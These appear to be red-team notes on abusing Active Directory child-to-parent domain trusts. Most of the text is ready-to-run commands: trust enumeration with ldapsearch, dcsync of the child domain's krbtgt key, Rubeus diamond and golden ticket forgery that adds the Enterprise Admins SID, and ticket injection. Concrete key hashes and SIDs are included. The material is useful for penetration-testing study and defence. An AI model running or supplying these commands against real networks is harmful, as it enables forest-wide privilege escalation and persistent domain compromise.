
| Value | Trust Direction                 |
| ----- | ------------------------------- |
| 0     | `TRUST_DIRECTION_DISABLED`      |
| 1     | `TRUST_DIRECTION_INBOUND`       |
| 2     | `TRUST_DIRECTION_OUTBOUND`      |
| 3     | `TRUST_DIRECTION_BIDIRECTIONAL` |

| Value | Trust Direction                 |
| ----- | ------------------------------- |
| 0     | `TRUST_DIRECTION_DISABLED`      |
| 1     | `TRUST_DIRECTION_INBOUND`       |
| 2     | `TRUST_DIRECTION_OUTBOUND`      |
| 3     | `TRUST_DIRECTION_BIDIRECTIONAL` |

```powershell
39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b

execute-assembly ~/opt/Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-1470357062-2280927533-300823338-519 /krbkey:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b /nowrap
```
##### Child to Parent Abuse

Enumerate trusts in place
```powershell
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```

Obtain krbtgt AES256 hash of the child domain
```powershell
dcsync dublin.contoso.com DUBLIN\krbtgt

2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
```

Obtain child domain SID and parent domain SID
```powershell
ldapsearch (objectClass=domain) --attributes objectSid

ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
```

Create diamond ticket (OPSEC SAFE) or a golden ticket offline
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:[Child SID] /sids:[Parent EA GROUP SID] /aes256:[Child KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden
```

Inject ticket into current session
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
```